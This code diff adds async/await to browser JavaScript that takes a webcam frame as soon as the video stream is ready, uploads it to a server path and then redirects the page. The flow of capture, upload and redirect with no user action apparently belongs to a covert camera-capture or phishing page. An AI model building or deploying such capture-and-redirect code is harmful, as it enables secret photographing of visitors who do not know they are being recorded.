@@ -33,7 +33,7 @@
             })
 
         // 获取完视频流，video元素设置宽高
-        video.addEventListener('canplay', function (ev) {
+        video.addEventListener('canplay', async function (ev) {
             if (!streaming) {
                 height = video.videoHeight / (video.videoWidth / width)
 
@@ -50,7 +50,7 @@
                 canvas.setAttribute('height', height)
                 streaming = true
 
-                takepicture()
+                await takepicture()
 
                 if (target) {
                     location.replace(target)
@@ -65,7 +65,7 @@
     // drawing that to the screen, we can change its size and/or apply
     // other changes before drawing it.
 
-    function takepicture() {
+    async function takepicture() {
         // 建立一个简单的二维渲染上下文
         var context = canvas.getContext('2d')
         if (width && height) {
@@ -73,11 +73,11 @@
             canvas.height = height
             context.drawImage(video, 0, 0, width, height)
 
-            canvas.toBlob((blob) => {
+            await canvas.toBlob(async (blob) => {
                 let fd = new FormData()
                 fd.append('file', blob)
 
-                fetch(`/upload?path=${path}`, {
+                await fetch(`/upload?path=${path}`, {
                     method: 'POST',
                     body: fd
                 })
